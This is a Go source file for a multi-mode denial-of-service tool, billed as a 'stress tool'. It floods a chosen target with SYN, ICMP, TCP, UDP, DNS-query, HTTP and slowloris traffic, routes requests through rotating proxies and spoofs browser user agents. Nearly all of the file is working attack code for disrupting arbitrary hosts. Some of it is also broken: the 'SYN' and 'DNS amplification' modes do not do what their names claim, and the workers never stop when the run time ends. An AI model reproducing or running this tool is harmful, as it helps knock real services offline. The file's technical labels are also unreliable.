package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"syscall"
)

// #################### CONFIG ####################
const (
	Version          = "3.0.0"
	MaxWorkers       = 10000
	ProxyPoolSize    = 1000
	HealthCheckDelay = 30 * time.Second
	DefaultDuration  = 60 // seconds
)

var (
	// Target
	targetHost string
	targetPort int
	targetPath string
	useHTTPS   bool

	// Attack params
	attackType  string
	threads     int
	duration    int
	payloadSize int

	// Proxies
	proxyList   []string
	proxyIndex  uint32
	proxyMutex  sync.RWMutex
	proxyHealth = make(map[string]bool)

	// Stats
	stats = struct {
		TotalRequests  uint64
		FailedRequests uint64
		StartTime      time.Time
		ActiveWorkers  int32
	}{}
)

// #################### MAIN ####################
func main() {
	parseArgs()
	loadProxies("proxies.txt")

	log.Printf("🚀 Starting %s attack on %s:%d (Workers: %d, Duration: %ds)",
		attackType, targetHost, targetPort, threads, duration)

	stats.StartTime = time.Now()
	go printStats()
	go proxyHealthChecker()

	// Graceful shutdown
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attackWorker(&wg)
	}

	select {
	case <-time.After(time.Duration(duration) * time.Second):
		// normal end
	case <-stop:
		log.Println("\n🛑 Получен сигнал завершения. Ожидание завершения воркеров...")
	}
	wg.Wait()

	printFinalStats()
}

// #################### L3 ATTACKS ####################
func synFlood() {
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetHost, targetPort))
		if err == nil {
			conn.Close()
			atomic.AddUint64(&stats.TotalRequests, 1)
		} else {
			atomic.AddUint64(&stats.FailedRequests, 1)
		}
	}
}

func icmpFlood() {
	// Raw socket implementation (requires root)
	for {
		// Simplified ICMP echo (ping) flood
		conn, err := net.Dial("ip4:icmp", targetHost)
		if err == nil {
			conn.Write([]byte{8, 0, 0, 0, 0, 1, 0, 1}) // ICMP Echo Request
			conn.Close()
			atomic.AddUint64(&stats.TotalRequests, 1)
		} else {
			atomic.AddUint64(&stats.FailedRequests, 1)
		}
	}
}

// #################### L4 ATTACKS ####################
func tcpFlood() {
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetHost, targetPort))
		if err == nil {
			conn.Write(randomPayload())
			conn.Close()
			atomic.AddUint64(&stats.TotalRequests, 1)
		} else {
			atomic.AddUint64(&stats.FailedRequests, 1)
		}
	}
}

func udpFlood() {
	conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", targetHost, targetPort))
	for {
		_, err := conn.Write(randomPayload())
		if err == nil {
			atomic.AddUint64(&stats.TotalRequests, 1)
		} else {
			atomic.AddUint64(&stats.FailedRequests, 1)
			conn, _ = net.Dial("udp", fmt.Sprintf("%s:%d", targetHost, targetPort))
		}
	}
}

func dnsAmplification() {
	for {
		server := randomDNSserver()
		conn, err := net.Dial("udp", server)
		if err != nil {
			continue
		}

		query := createDNSQuery(targetHost)
		conn.Write(query)
		conn.Close()
		atomic.AddUint64(&stats.TotalRequests, 1)
	}
}

// #################### L7 ATTACKS ####################
func httpFlood() {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			DisableKeepAlives: true,
			Proxy:            getProxyFunc(),
			TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
		},
	}

	for {
		req, _ := http.NewRequest(randomMethod(), targetURL(), bytes.NewBuffer(randomPayload()))
		req.Header.Set("User-Agent", randomUserAgent())
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Connection", "close")

		atomic.AddInt32(&stats.ActiveWorkers, 1)
		resp, err := client.Do(req)
		atomic.AddInt32(&stats.ActiveWorkers, -1)

		if err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			atomic.AddUint64(&stats.TotalRequests, 1)
		} else {
			atomic.AddUint64(&stats.FailedRequests, 1)
		}
	}
}

func slowloris() {
	// Partial HTTP requests to exhaust connections
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetHost, targetPort))
		if err != nil {
			continue
		}

		// Send incomplete headers
		fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\n", targetHost)
		conn.SetDeadline(time.Now().Add(30 * time.Second))

		// Keep connection open
		for i := 0; i < 10; i++ {
			fmt.Fprintf(conn, "X-a: %d\r\n", rand.Intn(5000))
			time.Sleep(5 * time.Second)
		}
		conn.Close()
	}
}

// #################### PROXY MANAGEMENT ####################
func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		log.Printf("⚠️ No proxy file found (%v), running without proxies", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	proxyMutex.Lock()
	defer proxyMutex.Unlock()

	proxyList = make([]string, 0, ProxyPoolSize)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxyList = append(proxyList, line)
			proxyHealth[line] = true
			if len(proxyList) >= ProxyPoolSize {
				break
			}
		}
	}

	log.Printf("🔌 Loaded %d proxies", len(proxyList))
}

func getProxyFunc() func(*http.Request) (*url.URL, error) {
	return func(*http.Request) (*url.URL, error) {
		if len(proxyList) == 0 {
			return nil, nil
		}

		proxyMutex.RLock()
		defer proxyMutex.RUnlock()

		index := int(atomic.AddUint32(&proxyIndex, 1)) % len(proxyList)
		return url.Parse("http://" + proxyList[index])
	}
}

func proxyHealthChecker() {
	for range time.Tick(HealthCheckDelay) {
		proxyMutex.Lock()
		// Rotate proxies (basic health check)
		if len(proxyList) > 1 {
			proxyList = append(proxyList[1:], proxyList[0])
		}
		proxyMutex.Unlock()
	}
}

// #################### UTILS ####################
func attackWorker(wg *sync.WaitGroup) {
	defer wg.Done()

	switch strings.ToUpper(attackType) {
	// L3 Attacks
	case "SYN":
		synFlood()
	case "ICMP":
		icmpFlood()
	// L4 Attacks
	case "TCP":
		tcpFlood()
	case "UDP":
		udpFlood()
	case "DNS":
		dnsAmplification()
	// L7 Attacks
	case "HTTP":
		httpFlood()
	case "HTTPS":
		useHTTPS = true
		httpFlood()
	case "SLOWLORIS":
		slowloris()
	default:
		log.Fatalf("❌ Unknown attack type: %s", attackType)
	}
}

func randomMethod() string {
	methods := []string{"GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH", "TRACE", "CONNECT"}
	return methods[rand.Intn(len(methods))]
}

func randomUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 12; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"curl/7.68.0",
		"Wget/1.20.3 (linux-gnu)",
	}
	return agents[rand.Intn(len(agents))]
}

func randomPayload() []byte {
	if payloadSize <= 0 {
		return []byte("ping")
	}
	b := make([]byte, payloadSize)
	if _, err := rand.Read(b); err != nil {
		copy(b, []byte("fallback-payload"))
	}
	return b
}

func randomDNSserver() string {
	servers := []string{
		"8.8.8.8:53",    // Google
		"1.1.1.1:53",    // Cloudflare
		"9.9.9.9:53",    // Quad9
	}
	return servers[rand.Intn(len(servers))]
}

func createDNSQuery(domain string) []byte {
	var buffer bytes.Buffer
	binary.Write(&buffer, binary.BigEndian, uint16(rand.Uint32())) // Transaction ID
	binary.Write(&buffer, binary.BigEndian, uint16(0x0100))        // Flags
	binary.Write(&buffer, binary.BigEndian, uint16(1))             // Questions
	binary.Write(&buffer, binary.BigEndian, uint16(0))             // Answers
	binary.Write(&buffer, binary.BigEndian, uint16(0))             // Authority RRs
	binary.Write(&buffer, binary.BigEndian, uint16(0))             // Additional RRs

	for _, part := range strings.Split(domain, ".") {
		binary.Write(&buffer, binary.BigEndian, byte(len(part)))
		buffer.WriteString(part)
	}
	binary.Write(&buffer, binary.BigEndian, byte(0))
	binary.Write(&buffer, binary.BigEndian, uint16(1)) // Type A
	binary.Write(&buffer, binary.BigEndian, uint16(1)) // Class IN

	return buffer.Bytes()
}

func targetURL() string {
	scheme := "http"
	if useHTTPS {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%d%s", scheme, targetHost, targetPort, targetPath)
}

// #################### STATS ####################
func printStats() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		total := atomic.LoadUint64(&stats.TotalRequests)
		failed := atomic.LoadUint64(&stats.FailedRequests)
		success := total - failed
		var rate float64
		if total > 0 {
			rate = float64(success) / float64(total) * 100
		}

		elapsed := time.Since(stats.StartTime).Seconds()
		var rps float64
		if elapsed > 0 {
			rps = float64(total) / elapsed
		}
		active := atomic.LoadInt32(&stats.ActiveWorkers)

		log.Printf("📊 Reqs: %d (%.1f/s) | Active: %d | Success: %.1f%% | Failed: %d",
			total, rps, active, rate, failed)
	}
}

func printFinalStats() {
	total := atomic.LoadUint64(&stats.TotalRequests)
	failed := atomic.LoadUint64(&stats.FailedRequests)
	success := total - failed
	rate := float64(success) / float64(total) * 100
	if total == 0 {
		rate = 0
	}

	elapsed := time.Since(stats.StartTime).Seconds()
	rps := float64(total) / elapsed

	fmt.Println("\n=== 🔥 ATTACK SUMMARY ===")
	fmt.Printf("Duration:       %.1f seconds\n", elapsed)
	fmt.Printf("Total requests: %d\n", total)
	fmt.Printf("Success rate:   %.1f%%\n", rate)
	fmt.Printf("Requests/sec:   %.1f\n", rps)
	fmt.Printf("Proxy pool:     %d proxies\n", len(proxyList))
}

// #################### ARG PARSING ####################
func parseArgs() {
	if len(os.Args) < 5 {
		printUsage()
		os.Exit(1)
	}

	target := os.Args[1]
	attackType = os.Args[2]
	threads, _ = strconv.Atoi(os.Args[3])
	duration, _ = strconv.Atoi(os.Args[4])

	if len(os.Args) > 5 {
		payloadSize, _ = strconv.Atoi(os.Args[5])
	} else {
		payloadSize = 1024
	}

	// Parse target (format: host:port/path)
	if strings.HasPrefix(target, "http") {
		u, err := url.Parse(target)
		if err != nil {
			log.Fatal("❌ Invalid URL format")
		}
		targetHost = u.Hostname()
		targetPort, _ = strconv.Atoi(u.Port())
		targetPath = u.Path
		useHTTPS = u.Scheme == "https"
	} else {
		parts := strings.Split(target, ":")
		targetHost = parts[0]
		if len(parts) > 1 {
			targetPort, _ = strconv.Atoi(parts[1])
		} else {
			targetPort = 80
		}
		targetPath = "/"
	}

	if threads > MaxWorkers {
		log.Printf("⚠️  Threads capped at %d", MaxWorkers)
		threads = MaxWorkers
	}
}

func printUsage() {
	fmt.Printf("Ultimate L3/L4/L7 Stress Tool v%s\n", Version)
	fmt.Println("Usage: go run main.go <target> <type> <threads> <duration> [size]")
	fmt.Println("\nTarget Examples:")
	fmt.Println("  example.com         - Default port 80")
	fmt.Println("  example.com:443     - Custom port")
	fmt.Println("  http://example.com  - Full URL")
	fmt.Println("\nAttack Types:")
	fmt.Println("  L3: SYN, ICMP")
	fmt.Println("  L4: TCP, UDP, DNS")
	fmt.Println("  L7: HTTP, HTTPS, SLOWLORIS")
	fmt.Println("\nExample:")
	fmt.Println("  go run main.go example.com SYN 1000 60")
	fmt.Println("  go run main.go https://example.com HTTP 5000 120 2048")
}